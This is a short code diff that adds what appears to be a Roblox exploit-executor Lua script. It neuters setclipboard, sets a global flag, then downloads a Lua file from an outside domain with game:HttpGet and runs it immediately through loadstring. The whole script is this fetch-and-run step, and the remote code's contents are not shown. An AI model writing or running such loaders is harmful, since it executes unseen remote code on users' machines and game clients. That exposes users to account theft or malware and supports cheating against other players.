@@ -1,0 +1,8 @@
+setclipboard = function(text)
+    print(text)
+end
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space/90e2e8a586dacf829fce1a65.lua", true))()
+
+wait(20)
+
